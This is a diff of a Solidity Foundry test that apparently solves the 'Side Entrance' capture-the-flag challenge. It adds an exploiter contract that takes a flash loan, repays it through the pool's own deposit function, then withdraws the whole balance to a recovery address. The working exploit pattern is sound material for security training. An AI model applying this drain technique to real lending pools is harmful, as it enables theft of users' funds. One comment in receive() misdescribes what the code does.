@@ -5,6 +5,32 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
 
+contract SideEntranceExploiter {
+    SideEntranceLenderPool private pool;
+    address private recovery;
+
+    constructor(SideEntranceLenderPool _pool, address _recovery) {
+        pool = _pool;
+        recovery = _recovery;
+    }
+
+    function startAttack() public {
+        pool.flashLoan(address(pool).balance);
+        pool.withdraw();
+    }
+
+    // We were required to call an execute function during the flashLoan and get the money back to the pool.
+    function execute() public payable{
+        pool.deposit{value: msg.value}();
+    }
+// Because of handling ETH, we need a receive function which as soon as it receives the ETH sends to the recovery address
+    receive() external payable {
+        //Deposit the received ETH back to the pool
+        payable(recovery).transfer(address(this).balance); //Transfer syntax 
+        //Recovery is now made into payable to be able to receive ETH.
+    }
+}
+
 contract SideEntranceChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -45,7 +71,14 @@ contract SideEntranceChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_sideEntrance() public checkSolvedByPlayer {
-        
+        // Deploy the exploiter
+        SideEntranceExploiter attacker = new SideEntranceExploiter(
+            pool,
+            recovery
+        );
+
+        //Start attack
+        attacker.startAttack();
     }
 
     /**
@@ -53,6 +86,10 @@ contract SideEntranceChallenge is Test {
      */
     function _isSolved() private view {
         assertEq(address(pool).balance, 0, "Pool still has ETH");
-        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
+        assertEq(
+            recovery.balance,
+            ETHER_IN_POOL,
+            "Not enough ETH in recovery account"
+        );
     }
 }
